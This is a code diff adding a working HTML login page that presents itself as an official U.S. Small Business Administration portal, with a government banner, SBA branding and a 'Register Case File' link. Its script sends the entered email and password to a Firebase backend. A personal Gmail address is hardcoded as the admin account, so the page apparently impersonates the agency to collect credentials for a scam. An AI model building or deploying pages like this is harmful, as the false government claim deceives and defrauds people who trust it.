@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA Portal | Secure Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
+        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #f8fafc; -webkit-tap-highlight-color: transparent; }
+        
+        .gov-top { background: #f0f0f0; color: #444; font-size: 10px; padding: 8px 20px; border-bottom: 1px solid #ddd; font-weight: 700; }
+        .sba-logo-box { position: relative; display: inline-block; padding: 4px 8px; }
+        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 5px; border-top: 3px solid var(--sba-blue); border-left: 3px solid var(--sba-blue); border-right: 3px solid var(--sba-blue); }
+        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 3px; background: var(--sba-red); }
+
+        .auth-card { border-radius: 4px; border-top: 6px solid var(--sba-blue); box-shadow: 0 15px 30px rgba(0,0,0,0.08); }
+        .btn-sba { background-color: var(--sba-blue); border-bottom: 4px solid #001a3d; transition: all 0.1s; }
+        .btn-sba:active { transform: translateY(2px); border-bottom-width: 0; }
+        
+        input { font-size: 16px !important; } /* Prevents iOS zoom on focus */
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <div class="gov-top flex items-center gap-2 uppercase tracking-tight">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4" alt="US Flag">
+        <span>Official U.S. Government Portal</span>
+    </div>
+
+    <header class="bg-white border-b border-gray-200 py-5 px-6 flex justify-center shadow-sm">
+        <div class="flex items-center gap-3">
+            <div class="sba-logo-box">
+                <span class="text-xl font-black text-[#002e6d] tracking-tighter">SBA</span>
+            </div>
+            <div class="text-left">
+                <p class="text-[8px] font-black text-slate-400 uppercase leading-none mb-0.5">U.S. Small Business</p>
+                <p class="text-[10px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="flex-grow flex items-center justify-center p-5">
+        <div class="w-full max-w-md">
+            <div class="bg-white auth-card p-8 border border-gray-200">
+                
+                <div class="mb-8 text-center">
+                    <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Portal Access</h2>
+                    <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mt-1">Personnel Authentication</p>
+                </div>
+
+                <div id="alertBox" class="hidden mb-6 p-4 rounded-sm bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-bold italic uppercase"></div>
+
+                <form id="loginForm" class="space-y-6">
+                    <div>
+                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2">Account Email</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-400">
+                                <i class="fas fa-user-shield"></i>
+                            </span>
+                            <input type="email" id="email" required class="w-full pl-11 pr-4 py-4 bg-slate-50 border border-slate-200 rounded-sm outline-none focus:border-[#002e6d] focus:bg-white font-semibold text-sm transition-all" placeholder="Enter Email">
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="flex justify-between items-center mb-2">
+                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest">Secure Passkey</label>
+                            <a href="forgot-password.html" class="text-[9px] font-black text-blue-700 uppercase hover:underline">Forgot?</a>
+                        </div>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-400">
+                                <i class="fas fa-lock"></i>
+                            </span>
+                            <input type="password" id="pass" required class="w-full pl-11 pr-4 py-4 bg-slate-50 border border-slate-200 rounded-sm outline-none focus:border-[#002e6d] focus:bg-white font-semibold text-sm transition-all" placeholder="••••••••">
+                        </div>
+                    </div>
+
+                    <button type="submit" id="submitBtn" class="btn-sba w-full text-white font-black py-5 rounded-sm shadow-lg uppercase tracking-[0.2em] text-xs mt-4">
+                        Authorize Session
+                    </button>
+                </form>
+
+                <div class="mt-10 pt-6 border-t border-slate-100 text-center">
+                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-4">New to the portal?</p>
+                    <a href="register.html" class="inline-block text-[#cc0000] font-black text-[11px] uppercase tracking-widest border-b-2 border-[#cc0000] pb-1">
+                        Register Case File
+                    </a>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="py-6 text-center text-[9px] text-slate-400 font-bold uppercase tracking-widest">
+        SECURE NODE ACCESS | AES-256 ENCRYPTED
+    </footer>
+
+    <script type="module">
+        import { auth } from './firebase-config.js';
+        import { signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        const btn = document.getElementById('submitBtn');
+        const alertBox = document.getElementById('alertBox');
+        const ADMIN_EMAIL = "liger4683@gmail.com";
+
+        document.getElementById('loginForm').onsubmit = async (e) => {
+            e.preventDefault();
+            alertBox.classList.add('hidden');
+            
+            const email = document.getElementById('email').value.toLowerCase().trim();
+            const pass = document.getElementById('pass').value;
+
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> AUTHORIZING...';
+
+            try {
+                const userCredential = await signInWithEmailAndPassword(auth, email, pass);
+                const user = userCredential.user;
+
+                // 1. Admin Redirect
+                if (email === ADMIN_EMAIL) {
+                    window.location.href = "admin-portal.html";
+                    return;
+                }
+
+                // 2. Verification Redirect
+                if (user.emailVerified) {
+                    window.location.href = "dashboard.html";
+                } else {
+                    window.location.href = "verify.html";
+                }
+
+            } catch (error) {
+                btn.disabled = false;
+                btn.innerText = "Authorize Session";
+                alertBox.classList.remove('hidden');
+                alertBox.innerText = "ACCESS DENIED: Invalid credentials.";
+            }
+        };
+    </script>
+</body>
+</html>
